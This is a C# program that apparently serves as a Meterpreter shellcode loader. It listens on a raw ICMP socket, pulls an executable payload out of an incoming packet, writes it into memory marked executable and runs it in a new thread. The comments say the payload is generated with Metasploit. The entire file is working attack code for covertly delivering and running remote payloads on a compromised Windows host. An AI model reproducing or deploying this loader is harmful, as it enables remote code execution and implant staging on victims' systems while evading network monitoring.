
using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Net;
namespace TCPMeterpreterProcess
{
    class Program
    {   



        public static void Exp(byte[] IcmptoShell)
        {
            // native function??s compiled code
            // generated with metasploit
            byte[] shellcode = IcmptoShell;
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static byte[] getShellcode()
        {
            Socket List = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            List.Bind(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 0));
            List.IOControl(IOControlCode.ReceiveAll, new byte[] { 1, 0, 0, 0 }, new byte[] { 1, 0, 0, 0 });
            byte[] buffer = new byte[4096];
            EndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
            byte[] shellcode = new byte[4068];

            var bytesRead = List.ReceiveFrom(buffer, ref remoteEndPoint);
            System.Buffer.BlockCopy(buffer, 28, shellcode, 0, 4068);
            return shellcode;
        }
        static void Main(string[] args)
        {
            byte[] shellcode = getShellcode();
            Exp(shellcode);
        }


        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
        );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
        );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(
        string moduleName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(
        IntPtr hModule,
        string procName
        );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(
        string lpFileName
        );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
    }
}
